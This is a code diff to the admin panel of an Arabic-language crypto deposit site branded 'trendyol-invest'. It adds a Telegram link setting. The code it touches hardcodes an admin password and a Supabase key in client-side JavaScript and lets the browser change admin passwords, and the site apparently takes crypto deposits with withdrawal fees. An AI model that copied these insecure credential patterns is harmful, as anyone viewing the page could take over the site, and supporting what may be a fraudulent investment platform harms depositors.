@@ -554,6 +554,7 @@ select option{background:#162640;color:#e2d5b8;}
           <div class="fld"><label>إيميل الدعم</label><input id="s-email" placeholder="noreply@trendyol-invest.com"></div>
           <div class="fld"><label>رسوم السحب (%)</label><input type="number" id="s-fee" value="6"></div>
           <div class="fld"><label>الحد الأدنى للسحب ($)</label><input type="number" id="s-mw" value="50"></div>
+          <div class="fld"><label>رابط التلغرام</label><input id="s-telegram" placeholder="https://t.me/username أو https://t.me/joinchat/..."></div>
           <div class="fld"><label>كلمة مرور جديدة للأدمن</label><input type="password" id="s-ap" placeholder="اتركه فارغاً للإبقاء" oninput="this.dataset.changed='1'"></div>
         </div>
         <button class="btn bg-gold mt2" onclick="saveSet()">💾 حفظ الإعدادات</button>
@@ -663,7 +664,7 @@ select option{background:#162640;color:#e2d5b8;}
 <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 var DB=supabase.createClient('https://hnytoognlhubnopmgfay.supabase.co','sb_publishable_s28RnLc2XDGcLX2OnrhBUw_sljae1aZ');
 var ADMIN_PASSWORD='trendyol-invest57700152';
-var C={tron:'',eth:'',email:'noreply@trendyol-invest.com',fee:6,mw:50};
+var C={tron:'',eth:'',email:'noreply@trendyol-invest.com',fee:6,mw:50,telegram:''};
 var ME=null,ADM=false,TC=[],NL=[],UN=0,RT=null,PI=null,PC=null,DA=100,DN='tron';
 var popTimerInt=null;
 
@@ -767,7 +768,7 @@ async function syncAdminPassword(){
 
 async function loadC(){
   var r=await DB.from('settings').select('*').eq('id',1).single();
-  if(r.data){C.tron=r.data.tron_wallet||'';C.eth=r.data.eth_wallet||'';C.email=r.data.support_email||'noreply@trendyol-invest.com';C.fee=r.data.withdraw_fee||6;C.mw=r.data.min_withdraw||50;}
+  if(r.data){C.tron=r.data.tron_wallet||'';C.eth=r.data.eth_wallet||'';C.email=r.data.support_email||'noreply@trendyol-invest.com';C.fee=r.data.withdraw_fee||6;C.mw=r.data.min_withdraw||50;C.telegram=r.data.telegram_link||'';}
 }
 
 // REALTIME
@@ -1107,7 +1108,7 @@ async function renderAdm(){
   var et=document.getElementById('adm-tron'),ee=document.getElementById('adm-eth');
   if(et)et.textContent=C.tron||'لم يُضبط';if(ee)ee.textContent=C.eth||'لم يُضبط';
   document.getElementById('sup-em').textContent=C.email;
-  ['s-tron','s-eth','s-email','s-fee','s-mw'].forEach(function(id){var el=document.getElementById(id);if(!el)return;if(id==='s-tron')el.value=C.tron;else if(id==='s-eth')el.value=C.eth;else if(id==='s-email')el.value=C.email;else if(id==='s-fee')el.value=C.fee;else if(id==='s-mw')el.value=C.mw;});
+  ['s-tron','s-eth','s-email','s-fee','s-mw','s-telegram'].forEach(function(id){var el=document.getElementById(id);if(!el)return;if(id==='s-tron')el.value=C.tron;else if(id==='s-eth')el.value=C.eth;else if(id==='s-email')el.value=C.email;else if(id==='s-fee')el.value=C.fee;else if(id==='s-mw')el.value=C.mw;else if(id==='s-telegram')el.value=C.telegram;});
   var users=await DB.from('users').select('*',{count:'exact'});
   var deps=await DB.from('deposits').select('amount,status');
   var wds=await DB.from('withdrawals').select('amount,status');
@@ -1362,7 +1363,7 @@ async function rejK(id){await DB.from('users').update({kyc_status:'rejected'}).e
 async function editW(t){var cur=t==='tron'?C.tron:C.eth;var val=prompt('أدخل عنوان محفظة '+(t==='tron'?'TRON TRC-20':'Ethereum ERC-20')+':',cur||'');if(val!==null&&val.trim()){var upd={id:1};upd[t==='tron'?'tron_wallet':'eth_wallet']=val.trim();await DB.from('settings').upsert([upd]);if(t==='tron')C.tron=val.trim();else C.eth=val.trim();document.getElementById('adm-'+t).textContent=val.trim();tst('ok','تم الحفظ','');}}
 
 async function saveSet(){
-  var upd={id:1,tron_wallet:document.getElementById('s-tron').value.trim(),eth_wallet:document.getElementById('s-eth').value.trim(),support_email:document.getElementById('s-email').value.trim(),withdraw_fee:parseFloat(document.getElementById('s-fee').value)||6,min_withdraw:parseFloat(document.getElementById('s-mw').value)||50};
+  var upd={id:1,tron_wallet:document.getElementById('s-tron').value.trim(),eth_wallet:document.getElementById('s-eth').value.trim(),support_email:document.getElementById('s-email').value.trim(),withdraw_fee:parseFloat(document.getElementById('s-fee').value)||6,min_withdraw:parseFloat(document.getElementById('s-mw').value)||50,telegram_link:document.getElementById('s-telegram').value.trim()};
   var np=document.getElementById('s-ap').value;
   if(np){await DB.from('admins').update({password:np}).eq('username','admin');}
   await DB.from('settings').upsert([upd]);await loadC();tst('ok','تم الحفظ','✅');
